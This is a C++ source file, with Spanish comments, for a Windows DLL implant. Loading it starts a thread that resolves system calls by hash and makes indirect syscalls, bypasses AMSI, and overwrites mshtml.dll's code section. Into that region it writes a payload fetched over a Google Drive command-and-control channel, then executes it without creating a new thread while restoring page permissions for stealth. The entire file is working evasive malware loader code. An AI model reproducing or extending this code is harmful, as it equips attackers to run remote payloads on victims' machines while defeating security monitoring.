#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "crypto.h"
#include "api_hashes.h"
#include "gdrive_c2.h"
#include "advanced_bypass.h"
#include "syscalls.h"
#include "god_mode_stealth.h"

// Definiciones globales compartidas
PVOID g_SyscallGadget = NULL;
API_TABLE g_ApiTable = {0};

static void InitializeApiTable() {
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);

    g_ApiTable.NtAllocateVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
    g_ApiTable.NtAllocateVirtualMemory.ssn = GetSSN(g_ApiTable.NtAllocateVirtualMemory.address);
    
    g_ApiTable.NtProtectVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    g_ApiTable.NtProtectVirtualMemory.ssn = GetSSN(g_ApiTable.NtProtectVirtualMemory.address);

    g_ApiTable.NtWriteVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtWriteVirtualMemory);
    g_ApiTable.NtWriteVirtualMemory.ssn = GetSSN(g_ApiTable.NtWriteVirtualMemory.address);

    g_ApiTable.NtQueueApcThread.address = ResolveApiByHash(hNtdll, HASH_NtQueueApcThread);
    g_ApiTable.NtQueueApcThread.ssn = GetSSN(g_ApiTable.NtQueueApcThread.address);
    
    g_ApiTable.NtGetContextThread.address = ResolveApiByHash(hNtdll, HASH_NtGetContextThread);
    g_ApiTable.NtGetContextThread.ssn = GetSSN(g_ApiTable.NtGetContextThread.address);
    
    g_ApiTable.NtSetContextThread.address = ResolveApiByHash(hNtdll, HASH_NtSetContextThread);
    g_ApiTable.NtSetContextThread.ssn = GetSSN(g_ApiTable.NtSetContextThread.address);

    g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
    g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
}

static void ExecutePayload(PVOID pTargetAddr, SIZE_T targetSize) {
    uint8_t payload[4096];
    
    if (!GDrive_CheckForCommands((char*)payload, sizeof(payload))) return;

    if (pTargetAddr && sizeof(payload) <= targetSize) {
        // El área ya debería estar en PAGE_READWRITE gracias a ModuleStompRobust
        InvokeSyscall(g_ApiTable.NtWriteVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, pTargetAddr, payload, sizeof(payload), NULL);
        
        ULONG old;
        SIZE_T size = targetSize;
        // Restauramos permisos a PAGE_EXECUTE_READ para ser sigilosos (respaldado por archivo)
        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pTargetAddr, &size, PAGE_EXECUTE_READ, &old);
        
        ThreadlessExecute(pTargetAddr);
    }
}

extern "C" __declspec(dllexport) void StartPlugin() {
    g_SyscallGadget = FindSyscallGadgetViaHash();
    InitializeApiTable();
    
    BypassAMSI_HWBP(); 
    BypassAMSI_DataOnlyRobust();

    STOMP_CONTEXT ctx = {0};
    if (ModuleStompRobust(STOBFS_W(L"mshtml.dll"), 0x1000, &ctx)) {
        PVOID pTarget = (PBYTE)ctx.BaseAddress + ctx.TextSection->VirtualAddress;
        ExecutePayload(pTarget, ctx.RegionSize);
    }

    while (TRUE) {
        Sleep(60000);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartPlugin, NULL, 0, NULL);
    }
    return TRUE;
}
